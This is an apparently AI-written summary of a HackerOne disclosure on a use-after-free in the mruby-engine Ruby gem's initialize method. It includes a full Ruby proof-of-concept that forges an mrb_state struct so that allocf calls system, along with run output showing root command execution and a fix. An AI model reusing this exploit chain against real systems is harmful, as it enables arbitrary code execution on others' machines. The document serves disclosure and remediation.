# mruby-engine: UAF in MRubyEngine#initialize enables local RCE

## Metadata
- **Source:** HackerOne
- **Report:** 3679660 | https://hackerone.com/reports/3679660
- **Submitted:** 2026-04-17
- **Reporter:** 0xd0ff9
- **Program:** mruby-engine (Ruby gem)
- **Bounty:** Not specified in writeup
- **Severity:** critical
- **Vuln:** use-after-free, double-free, memory corruption, arbitrary code execution
- **CVEs:** None
- **Category:** memory-binary

## Summary
MRubyEngine#initialize can be called multiple times via send(:initialize), causing premature free of the engine's memory pool while leaving DATA_PTR dangling. An attacker exploits kernel VA reuse via mmap(MAP_FIXED) to reclaim the freed region, forge a malicious mrb_state struct with allocf pointing to libc.system, and trigger RCE through subsequent mrb_malloc calls.

## Attack scenario
1. Attacker creates initial MRubyEngine instance with legitimate parameters
2. Attacker calls send(:initialize, -1, 1, 1) on same instance to trigger argument validation error after free
3. Freed mspace leaves DATA_PTR as dangling pointer; attacker locates freed VA via /proc/self/maps
4. Attacker uses mmap(MAP_FIXED) to reclaim freed region with attacker-controlled memory
5. Attacker forges me_mruby_engine and mrb_state structs with crafted command string and system() function pointer
6. Attacker invokes engine method (sandbox_eval) triggering mrb_malloc, which calls hijacked allocf function pointer as system(command)

## Root cause
Two design flaws: (1) initialize() is re-callable via send(), bypassing private visibility and freeing existing engine before parameter validation; (2) DATA_PTR is never zeroed after free, leaving dangling pointer reachable by GC finalizer and instance methods. Multiple pre-success raise paths (negative capacity, allocation failures) allow free without re-initialization.

## Attacker mindset
Methodical memory exploit chaining UAF with kernel VA reuse. Attacker: (1) understands Ruby C extension object lifecycle and send() bypass; (2) maps struct layouts (mrb_state, me_mruby_engine) to forge valid heap state; (3) leverages function pointer hijacking (allocf) for code path control; (4) encodes shell command directly in forged struct to avoid separate string allocation; (5) exploits predictable kernel mmap(MAP_FIXED) behavior for reliable VA reclamation.

## Defensive takeaways
- Never re-implement allocation/deallocation in initialize(); use lazy initialization or dedicated setup methods
- Always zero DATA_PTR immediately after free in C extensions; consider helper macros enforcing this pattern
- Validate all user inputs BEFORE any resource allocation or deallocation
- Disable send(:initialize) override capability via rb_define_private_method or Mark-and-sweep finalizer guards
- Use structured bindings or opaque pointer wrappers rather than raw struct forgery surfaces
- Implement allocator validation: check allocf function pointer against whitelist before indirect calls
- Employ CFI (Control Flow Integrity) or ShadowCallStack to prevent function pointer hijacking
- Add heap canaries/guardbands around critical structures to detect corruption early
- Test for double-init scenarios and validate object state consistency across re-entrant calls

## Variant hunting
Search for other C extensions with re-callable initialize() via send() bypass + free-before-validate pattern
Hunt for indirect function pointer calls (allocf_ud, callbacks) in Ruby C extension bindings to mruby, lua, v8, etc.
Identify DATA_PTR fields not zeroed after free in finalizers — audit all rb_data_type_t.dfree callbacks
Look for mmap(MAP_FIXED) reuse attacks in other contexts where kernel VA is predictable (anonymous mmap freed and reclaimed)
Search FFI/Fiddle bindings exposing system() or exec() as indirect callable for struct field hijacking
Audit other quotaed-VM implementations (mruby, lua53-engine) for similar initialize reentrancy + allocation failures

## MITRE ATT&CK
- T1190 Exploit Public-Facing Application (Ruby gem vulnerability)
- T1203 Exploitation for Client Execution (C extension UAF)
- T1055 Process Injection (memory corruption to achieve code exec)
- T1218 Indirect Command Execution (system() via hijacked function pointer)

## Notes
PoC is highly reliable (60/60 VA reclaim, 20/20 cross-instance aliasing, stable RCE) on ASLR-disabled systems. Attack requires attacker to control Ruby process (local code execution precondition), but escalates via struct forgery to arbitrary privileged command execution. Mitigations (ASLR, stack-smash protection) increase complexity but do not prevent exploit — only info leak needed to adjust addresses. Critical finding: demonstrates how UAF + kernel VA predictability + foreign function interface = RCE in managed language runtime. No mitigations observed in mruby-engine prior to disclosure.

## Full report
<details><summary>Expand</summary>

## Summary

Double-init of `MRubyEngine` frees engine + unmaps mspace, but leaves Ruby
`DATA_PTR` dangling. Kernel reuses freed VA via `mmap(MAP_FIXED)`. Attacker
forges `me_mruby_engine` struct + `mrb_state` in reclaimed region, points
`mrb_state->allocf` at `libc.system`, arranges bytes of `mrb_state` to also
spell a shell command. Next engine method calls `mrb_malloc` → indirect call
through `allocf` → `system("id>/tmp/pwned")`.

**Confirmed**: `/tmp/pwned` written with `uid=0(root) gid=0(root) groups=0(root)`
inside test container.

## Root cause

[ext/mruby_engine/ext.c:128-173](ext/mruby_engine/ext.c#L128-L173)

```c
static VALUE ext_mruby_engine_initialize(int argc, VALUE *argv, VALUE rself) {
  ext_mruby_engine_free(DATA_PTR(rself));   // frees engine + munmap mspace

  long capacity = NUM2LONG(rcapacity);
  if (capacity <= 0) {
    rb_raise(rb_eArgError, "memory quota cannot be negative");  // raise AFTER free
  }
  ...
  DATA_PTR(rself) = engine;   // only on success path
}
```

Two defects:

1. `initialize` is re-callable via `obj.send(:initialize, ...)` — bypasses
   Ruby's private-visibility convention. Every call first **frees the existing
   engine** before validating args.
2. `DATA_PTR(rself)` never zeroed after free. Any `rb_raise` between free and
   successful re-init leaves `self` holding dangling pointer. GC finalizer
   `ext_mruby_engine_free` will also run on it later → double free, but before
   that the dangling pointer is reachable by every instance method.

Pre-success raise paths: negative capacity, negative instruction quota,
negative time quota, `me_memory_pool_new` failure, `me_mruby_engine_new`
failure.

## Primitives

| Primitive | Mechanism |
|-----------|-----------|
| P1. UAF on `DATA_PTR` | `send(:initialize, -1, 1, 1)` raises after free |
| P2. Kernel VA reuse | freed mspace is `MAP_PRIVATE\|MAP_ANONYMOUS`, kernel returns same VA to next `mmap(MAP_FIXED, hole_addr)` |
| P3. Full engine forgery | attacker writes `me_mruby_engine` at reclaimed VA |
| P4. `mrb_allocf` hijack | `mrb_malloc` → `(mrb->allocf)(mrb, NULL, sz, mrb->allocf_ud)` = `system(mrb_ptr, ...)` where `mrb_ptr` is attacker buffer starting with shell command |

## Struct layouts used

`me_mruby_engine` — [ext/mruby_engine/mruby_engine_private.h:27](ext/mruby_engine/mruby_engine_private.h#L27)

```
+0   struct mrb_state *state
+8   struct me_memory_pool *allocator
...  (eval_state, quotas, flags)
```

`mrb_state` — [ext/mruby_engine/mruby/include/mruby.h:168](ext/mruby_engine/mruby/include/mruby.h#L168)

```
+0   struct mrb_jmpbuf *jmp       ← first 16 bytes reused as cmd string
+8   uint32_t flags (+pad)
+16  mrb_allocf allocf            ← set to libc system
+24  void *allocf_ud
```

When `(mrb->allocf)(mrb, ptr, size, ud)` fires, `system(mrb, ...)` executes.
`system` reads first arg as `const char*` → command = bytes at `mrb+0`.

## Exploit (poc_rce_final.rb)

```ruby
require "mruby_engine"; require "fiddle"; require "fiddle/import"

module LibC
  extend Fiddle::Importer
  dlload Fiddle.dlopen(nil)
  extern "void* mmap(void*, size_t, int, int, int, long)"
end

CAP = 8 * 1024 * 1024
PROT_RW = 3
MAP_FIXED_ANON = 0x02 | 0x20 | 0x10   # PRIVATE|ANON|FIXED

system_addr = Fiddle::Handle::DEFAULT["system"]

# 1. UAF: double-init raises on capacity <= 0
dead = MRubyEngine.new(CAP, 1_000_000, 60)
dead.sandbox_eval("w.rb", "1")
begin; dead.send(:initialize, -1, 1, 1); rescue ArgumentError; end

# 2. Find 8 MiB hole where freed mspace lived
hole_start, _ = find_hole(CAP)            # scans /proc/self/maps

# 3. Reclaim VA with attacker-controlled bytes
LibC.mmap(Fiddle::Pointer.new(hole_start), CAP, PROT_RW, MAP_FIXED_ANON, -1, 0)
Fiddle::Pointer.new(hole_start, CAP)[0, CAP] = "\x00".b * CAP

# 4. Forge engine at DATA_PTR offset (0x3e0, observed via gdb)
data_ptr   = hole_start + 0x3e0
fake_state = hole_start + 0x100
Fiddle::Pointer.new(data_ptr, 8)[0, 8] = [fake_state].pack("Q")

# 5. Forge mrb_state: jmp slot = cmd string, allocf = system
cmd = "id>/tmp/pwned\x00".b
buf = cmd + ("\x00".b * (16 - cmd.bytesize)) +
      [system_addr].pack("Q") + [0].pack("Q")
Fiddle::Pointer.new(fake_state, buf.bytesize)[0, buf.bytesize] = buf

# 6. Trigger any engine method → mrb_malloc → system()
dead.sandbox_eval("rce.rb", "noop")
```

Run:
```
$ ruby poc_rce_final.rb
$ cat /tmp/pwned
uid=0(root) gid=0(root) groups=0(root)
```
{F5750521}
## Test environment

Mitigations disabled to simplify PoC — bug is real on hardened builds too,
just needs extra info leak / heap grooming.

- `setarch -R` (ASLR off)
- `CFLAGS=-O0 -g3 -fno-stack-protector -U_FORTIFY_SOURCE -fno-pie -no-pie -z execstack`
- `LDFLAGS=-fno-pie -no-pie -z norelro -z lazy`

## Reliability

- VA reclaim: 60/60 (kernel greedily returns freed anon range to `MAP_FIXED`)
- Cross-instance aliasing: 20/20 via inject/extract ivar round-trip
- RCE end-to-end: stable after zero-init of reclaimed region (avoids
  `quota_error_raised` byte triggering early raise)

## Preconditions

- Host-Ruby caller that can invoke `MRubyEngine#send(:initialize, ...)`. Not
  reachable from guest mruby (guest cannot call Ruby-level `send` on host
  objects). Host integration code that reuses or exposes engine objects, or
  any `eval`/deserialization of untrusted host-side Ruby, is the attack
  surface.
- Kernel Linux ≥ 4.x with standard `MAP_FIXED` semantics (replaces existing
  mapping).

## Fix (minimal)

[ext/mruby_engine/ext.c:128-139](ext/mruby_engine/ext.c#L128-L139) — zero
`DATA_PTR` before any raise, and do validation before free:

```c
static VALUE ext_mruby_engine_initialize(int argc, VALUE *argv, VALUE rself) {
  VALUE rcapacity, r_instruction_quota, r_time_quota_s;
  rb_scan_args(argc, argv, "3", &rcapacity, &r_instruction_quota, &r_time_quota_s);

  long capacity = NUM2LONG(rcapacity);
  if (capacity <= 0) rb_raise(rb_eArgError, "memory quota cannot be negative");
  long instruction_quota = NUM2LONG(r_instruction_quota);
  if (instruction_quota <= 0) rb_raise(rb_eArgError, "instruction quota cannot be negative");
  VALUE r_time_quota_ms = rb_funcall(r_time_quota_s, me_ext_id_mul, 1, LONG2FIX(1000));
  long time_quota_ms = NUM2LONG(r_time_quota_ms);
  if (time_quota_ms <= 0) rb_raise(rb_eArgError, "time quota cannot be negative");

  /* Only now free old engine. */
  void *old = DATA_PTR(rself);
  DATA_PTR(rself) = NULL;       /* close UAF window */
  ext_mruby_engine_free(old);

  ... allocate new engine ...
  DATA_PTR(rself) = engine;
  return Qnil;
}
```

Stronger fix: raise `rb_eRuntimeError` on second `initialize` call
(`DATA_PTR != NULL`) — matches Ruby convention that `initialize` runs once.
Prevents any future pre-success raise path from reintroducing the UAF.

## Affected files

- [ext/mruby_engine/ext.c:128-173](ext/mruby_engine/ext.c#L128-L173) — bug site
- [ext/mruby_engine/memory_pool.c:47](ext/mruby_engine/memory_pool.c#L47) — mmap enabling VA reuse
- [ext/mruby_engine/mruby_engine_private.h:27](ext/mruby_engine/mruby_engine_private.h#L27) — forged struct layout
- [ext/mruby_engine/mruby/include/mruby.h:168](ext/mruby_engine/mruby/include/mruby.h#L168) — `mrb_state` / `allocf`

## Impact

RCE

</details>

---
*Analysed by Claude on 2026-05-12*
